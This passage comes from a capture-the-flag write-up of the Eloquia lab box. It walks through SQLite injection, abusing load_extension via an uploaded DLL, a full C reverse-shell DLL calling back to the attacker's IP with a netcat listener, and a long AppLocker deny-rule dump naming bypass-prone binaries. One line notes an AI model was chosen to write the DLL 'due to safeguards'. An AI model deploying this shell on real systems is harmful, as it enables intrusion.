![image-20261013105823798](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0c50e915fcec0051.png)

![image-20261013105823798](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013105823798.webp)

`select version()` and `select @@version` both error out, but `select sqlite_version()` works:

![image-20261013105908438](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8e003cb5ccdac175.png)

![image-20261013105908438](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013105908438.webp)

`select name, sql from sqlite_master where type='table';` will list tables in the database. The only really interesting one is `Eloquia_customuser`, where I can dump the users:

![image-20261013111834679](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/86035dd0fefb5358.png)

![image-20261013111834679](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013111834679.webp)

I can try to crack these, but none crack quickly with `rockyou.txt`.

### Malicious Extension

#### Permissions Check

SQLite’s `load_extension()` can load a DLL as an extension, but Python’s sqlite3 turns that off by default. To see if it is enabled, I’ll run a simple test query, `select load_extension('C:\Windows\Temp\x');`. That file won’t exist, but if `load_extension` is disabled by permissions, I’ll get a “not authorized” response. However, I don’t get a “not authorized” message, but rather an issue that the file can’t be loaded:

![image-20261013120851381](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d2f1f399c8365a11.png)

![image-20261013120851381](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013120851381.webp)

That means `load_extension` is enabled!

I can try to load an extension from my host over SMB or HTTP, but it fails:

![image-20261013122900077](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1872fea5c091816c.png)

![image-20261013122900077](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013122900077.webp)

HTTP was never going to work, as Windows can’t load a DLL from a URL. The SMB fails because modern Windows blocks unauthenticated guest access to shares by default, and there’s no way to pass credentials through `load_extension`.

#### File Upload

I need a way to get a DLL file onto Eloquia. The only real upload I’ve had so far is the image upload via the user profile and the article banner, but both are locked down to just allow images.

However, the article page in the Django admin panel also lets me upload a replacement banner, and it doesn’t enforce the image check:

![image-20261013124056844](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/50248712e83fa15a.png)

![image-20261013124056844](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013124056844.webp)

#### Load Uploaded File

To test if I can upload a file and find it with `load_extension`, I’ll upload a simple PNG but named `htb.dll`:

![image-20261013151051637](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/29ede1bdccc3dc43.png)

![image-20261013151051637](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013151051637.webp)

In the database, banners are stored as relative paths (`select title,banner from Eloquia_article;`):

![image-20261013124005682](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f39cf8c77ffe2c98.png)

![image-20261013124005682](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013124005682.webp)

That suggests the app resolves them from its working directory. If SQLite runs from that same directory, the same relative path should work for `load_extension`. I’ll try to load the `htb` module:

![image-20261013151118859](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0cdf2004d266694d.png)

![image-20261013151118859](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013151118859.webp)

It says it is not a valid Win32 application (which is correct). That means it found the file and tried to load it.

#### msfvenom \[Fail\]

The easiest way to get a DLL reverse shell is with `msfvenom`:

```
oxdf@hacky$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.169 LPORT=443 -f dll > rev.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
```

I’ll upload that and then try to load it. It hangs for a minute, and then returns:

![image-20261013153436718](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6e1e88fcc14dc44b.png)

![image-20261013153436718](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013153436718.webp)

Sometimes it returns a more specific message:

![image-20261013153413140](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2315f375b8b23adb.png)

![image-20261013153413140](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013153413140.webp)

Even without that message, the DLL disappearing is a good sign it’s being eaten by Defender (I’ll show this in the Defender logs in [Beyond Root](#msfvenom-dlls-and-defender)).

#### Custom DLL

I’ll create a simple DLL reverse shell. I’ve done this in the past, but this time I let Claude (using Opus 4.8 due to safeguards) create it:

```c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

// Exported so SQLite accepts the DLL as a loadable extension.
__declspec(dllexport) int sqlite3_extension_init() { return 0; }

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "10.10.15.169";
char port[6] = "443";

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

        struct hostent *host;
        host = gethostbyname(ip_addr);
        strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

        hax.sin_family = AF_INET;
        hax.sin_port = htons(atoi(port));
        hax.sin_addr.s_addr = inet_addr(ip_addr);

        WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

        memset(&ini_processo, 0, sizeof(ini_processo));
        ini_processo.cb = sizeof(ini_processo);
        ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        TCHAR cmd[255] = TEXT("cmd.exe");
        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

        return 0;
    }
    return TRUE;
}
```

At the top it exports a `sqlite3_extension_init` function that just returns 0, which is the entry point SQLite looks for in an extension. Windows calls `DllMain` as soon as the DLL loads, before SQLite calls anything, and that’s where the reverse shell linked to `cmd.exe` is. `DllMain` returns 0 (FALSE), which tells Windows the load failed, so SQLite never calls the export. That’s fine, as `cmd.exe` is already running with the socket. I will find that if I use `PowerShell.exe` instead of `cmd.exe`, it doesn’t work. I’ll learn why later.

I’ll compile this (giving it the `ws2_32` library) on my Linux host with MinGW:

```
oxdf@hacky$ x86_64-w64-mingw32-gcc -shared -o sqlite_rev.dll sqlite_rev.c -lws2_32
```

And upload it. If I upload something with a name that already exists, it appends random junk to it, so it’s worth going back to the page to check:

![image-20261013153830812](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/632edcb4f3491a5c.png)

![image-20261013153830812](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013153830812.webp)

When I load this, it reports failure (from `DllMain` returning 0):

![image-20261013153906136](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4d441aa5ad63b80f.png)

![image-20261013153906136](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261013153906136.webp)

But at `nc` I get a shell:

```
oxdf@hacky$ sudo rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.244.81 57239
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Web\Eloquia>whoami
eloquia\web
```

I’ll find the user flag on the web user’s desktop:

```
C:\Users\web\Desktop>type user.txt
37f45149************************
```

## Shell as olivia.kat

### Enumeration

#### AppLocker

One of the first things I’ll try is to move from `cmd` to `powershell`, but it’s blocked:

```
C:\Users\web\Desktop>powershell
This program is blocked by group policy. For more information, contact your system administrator.
```

This is AppLocker. I can dump all the rules:

```html
C:\Users\web\Desktop>reg query "HKLM\Software\Policies\Microsoft\Windows\SrpV2" /s

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Appx
    EnforcementMode    REG_DWORD    0x1
    AllowWindows    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Appx\29eaa4a4-5c8d-46eb-8af0-1b034d2306a6
    Value    REG_SZ    <FilePublisherRule Id="29eaa4a4-5c8d-46eb-8af0-1b034d2306a6" Name="Signed by Microsoft Corporation" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Appx\593b55dd-97c3-42d5-a0ce-c68469a1f406
    Value    REG_SZ    <FilePublisherRule Id="593b55dd-97c3-42d5-a0ce-c68469a1f406" Name="Signed by Microsoft Corporation" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Appx\df8478b9-3c6d-4ad7-aa5f-21116dc6e459
    Value    REG_SZ    <FilePublisherRule Id="df8478b9-3c6d-4ad7-aa5f-21116dc6e459" Name="Signed by Skype" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="CN=Skype Software Sarl, O=Microsoft Corporation, L=Luxembourg, S=Luxembourg, C=LU" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Dll
    EnforcementMode    REG_DWORD    0x0
    AllowWindows    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe
    EnforcementMode    REG_DWORD    0x1
    AllowWindows    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\0062425b-0576-44a9-b6bf-d42c6daa9aa6
    Value    REG_SZ    <FilePublisherRule Id="0062425b-0576-44a9-b6bf-d42c6daa9aa6" Name="Block MSHTA.EXE (.NET utilities)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="INTERNET EXPLORER" BinaryName="MSHTA.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\008cab07-5790-4eb5-b024-4488db0df44d
    Value    REG_SZ    <FilePublisherRule Id="008cab07-5790-4eb5-b024-4488db0df44d" Name="Block ATBROKER.EXE (WINDOWS)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="ATBROKER.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\0229d798-eb3e-4d9a-ab3c-29ca9a7ceb27
    Value    REG_SZ    <FilePublisherRule Id="0229d798-eb3e-4d9a-ab3c-29ca9a7ceb27" Name="ODBCCONF.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="ODBCCONF.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\04b910b4-caab-4f18-84e5-29ae5b4802af
    Value    REG_SZ    <FilePublisherRule Id="04b910b4-caab-4f18-84e5-29ae5b4802af" Name="MSHTA.EXE, i INTERNET EXPLORER, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="INTERNET EXPLORER" BinaryName="MSHTA.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\0532a4fa-4e03-4fe5-a0ed-34914e6719a3
    Value    REG_SZ    <FilePathRule Id="0532a4fa-4e03-4fe5-a0ed-34914e6719a3" Name="%SYSTEM32%\Tasks:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Tasks:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\0a7803cc-deb4-42c3-9854-31537cc6d19a
    Value    REG_SZ    <FilePathRule Id="0a7803cc-deb4-42c3-9854-31537cc6d19a" Name="Users-writable Path: %WINDIR%\SysWOW64\FxsTmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\SysWOW64\FxsTmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\0ad8fa11-365e-4e49-9049-8e896f8ee7f3
    Value    REG_SZ    <FilePathRule Id="0ad8fa11-365e-4e49-9049-8e896f8ee7f3" Name="Users-writable Path: %WINDIR%\Logs\OpsMgrTrace" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Logs\OpsMgrTrace"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\1283b14d-d8b9-4266-a5c0-66c07d6a0273
    Value    REG_SZ    <FilePathRule Id="1283b14d-d8b9-4266-a5c0-66c07d6a0273" Name="%SYSTEM32%\spool\drivers\color:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\drivers\color:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\130740f8-8ac7-4570-b0b3-18575f366c8f
    Value    REG_SZ    <FilePublisherRule Id="130740f8-8ac7-4570-b0b3-18575f366c8f" Name="SYNCAPPVPUBLISHINGSERVER.EXE, i MICROSOFT (R) WINDOWS (R) OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFT (R) WINDOWS (R) OPERATING SYSTEM" BinaryName="SYNCAPPVPUBLISHINGSERVER.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\13bcae9c-a08c-4757-a803-c088e9e55d3e
    Value    REG_SZ    <FilePathRule Id="13bcae9c-a08c-4757-a803-c088e9e55d3e" Name="%SYSTEM32%\Fxstmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Fxstmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\14e91fa3-c567-4e9f-a4b3-25ee23c54a43
    Value    REG_SZ    <FilePathRule Id="14e91fa3-c567-4e9f-a4b3-25ee23c54a43" Name="Users-writable Path: %SYSTEM32%\spool\drivers\color\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\drivers\color\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\1b750a91-08d4-44b4-a2c2-bd2f62269892
    Value    REG_SZ    <FilePublisherRule Id="1b750a91-08d4-44b4-a2c2-bd2f62269892" Name="CDB.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="CDB.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\1d8a1b94-aac1-4790-ac57-65f18563bb1b
    Value    REG_SZ    <FilePathRule Id="1d8a1b94-aac1-4790-ac57-65f18563bb1b" Name="%WINDIR%\debug\WIA:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\debug\WIA:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\1de4320b-4296-4f71-b120-38ab9f81af9e
    Value    REG_SZ    <FilePublisherRule Id="1de4320b-4296-4f71-b120-38ab9f81af9e" Name="Block VSSADMIN.EXE (File often used by ransomware)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="VSSADMIN.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\1eb9f5d1-680a-4f1b-8d05-ad49c840fed1
    Value    REG_SZ    <FilePublisherRule Id="1eb9f5d1-680a-4f1b-8d05-ad49c840fed1" Name="Block IEEXEC.EXE (.NET Utilities)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="IEEXEC.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\1f98e1e8-b75c-4583-95b9-28b3a6d9614a
    Value    REG_SZ    <FilePublisherRule Id="1f98e1e8-b75c-4583-95b9-28b3a6d9614a" Name="Block BGINFO.EXE (Version 4.22 and below)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="BGINFO" BinaryName="BGINFO.EXE"><BinaryVersionRange LowSection="*" HighSection="4.22.0.0"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\2098f2a9-fb22-49d3-a126-fa7e8a859739
    Value    REG_SZ    <FilePathRule Id="2098f2a9-fb22-49d3-a126-fa7e8a859739" Name="%SYSTEM32%\winevt\Logs\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\winevt\Logs\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\225d337e-a22a-4841-a7d7-4b5c6edd6fc5
    Value    REG_SZ    <FilePathRule Id="225d337e-a22a-4841-a7d7-4b5c6edd6fc5" Name="%SYSTEM32%\Com\dmp:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Com\dmp:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\23180785-c109-4521-bf7d-2a39dc282960
    Value    REG_SZ    <FilePublisherRule Id="23180785-c109-4521-bf7d-2a39dc282960" Name="Block REGASM.EXE (.NET Utilities)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="REGASM.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\277c6c14-0897-4dde-ad25-e1710d758dc0
    Value    REG_SZ    <FilePublisherRule Id="277c6c14-0897-4dde-ad25-e1710d758dc0" Name="RUNDLL32.EXE, i MICROSOFTr WINDOWSr OPERATING SYSTEM, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="RUNDLL32.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\293e7480-f59e-4eab-b2f0-529c864d7e26
    Value    REG_SZ    <FilePublisherRule Id="293e7480-f59e-4eab-b2f0-529c864d7e26" Name="Block PRESENTATIONHOST.EXE (WPF Utilities)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="Microsoftr .NET Framework" BinaryName="PRESENTATIONHOST.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\2a6f3959-db20-4b59-bc4e-9c7719a648d1
    Value    REG_SZ    <FilePathRule Id="2a6f3959-db20-4b59-bc4e-9c7719a648d1" Name="%WINDIR%\Tasks:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Tasks:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\2b8d1528-ddfb-44cf-9e12-bce2fd30845f
    Value    REG_SZ    <FilePathRule Id="2b8d1528-ddfb-44cf-9e12-bce2fd30845f" Name="%SYSTEM32%\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\363d5a12-c578-4fe8-8903-e4f5104627f4
    Value    REG_SZ    <FilePublisherRule Id="363d5a12-c578-4fe8-8903-e4f5104627f4" Name="REGASM.EXE, i MICROSOFTr .NET FRAMEWORK, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="REGASM.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\38197077-ad09-4473-a91c-ae815f8923cb
    Value    REG_SZ    <FilePublisherRule Id="38197077-ad09-4473-a91c-ae815f8923cb" Name="Block DFSVC.EXE (.NET Utilities)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr .NET FRAMEWORK" BinaryName="DFSVC.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\3a2725b7-4717-47a7-8289-953fcacc10ba
    Value    REG_SZ    <FilePathRule Id="3a2725b7-4717-47a7-8289-953fcacc10ba" Name="Users-writable Path: %WINDIR%\Temp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Temp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\3d62a97c-acf5-4b67-966b-ae5649ac7829
    Value    REG_SZ    <FilePublisherRule Id="3d62a97c-acf5-4b67-966b-ae5649ac7829" Name="Block MSDT.EXE (Troubleshooting Packs)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="MSDT.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\3ecd7c04-e57e-4955-a5bf-3906131862c4
    Value    REG_SZ    <FilePathRule Id="3ecd7c04-e57e-4955-a5bf-3906131862c4" Name="Users-writable Path: %WINDIR%\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcon\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcon\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\3f665955-7e87-4555-87ad-4549fef9b0b6
    Value    REG_SZ    <FilePublisherRule Id="3f665955-7e87-4555-87ad-4549fef9b0b6" Name="FSI.EXE, i MICROSOFTr F#, fra O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr F#" BinaryName="FSI.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\4114a1d0-04dc-473b-8556-9f549a268eea
    Value    REG_SZ    <FilePublisherRule Id="4114a1d0-04dc-473b-8556-9f549a268eea" Name="Block KD.EXE  (Debuggers)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFTr WINDOWSr OPERATING SYSTEM" BinaryName="KD.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\428c5fff-a9f5-47a9-a616-c08d4b2e48d4
    Value    REG_SZ    <FilePublisherRule Id="428c5fff-a9f5-47a9-a616-c08d4b2e48d4" Name="Block CMSTP.EXE (CONNECTION MANAGER)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFT(R) CONNECTION MANAGER" BinaryName="CMSTP.EXE"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\42a009bf-e003-4019-836f-4b887554f304
    Value    REG_SZ    <FilePathRule Id="42a009bf-e003-4019-836f-4b887554f304" Name="SCCM - %WINDIR%\ccm\logs\*" Description="SCCM Specific" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\logs\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\45073ce5-caf5-498c-b5e8-e819cf4b0625
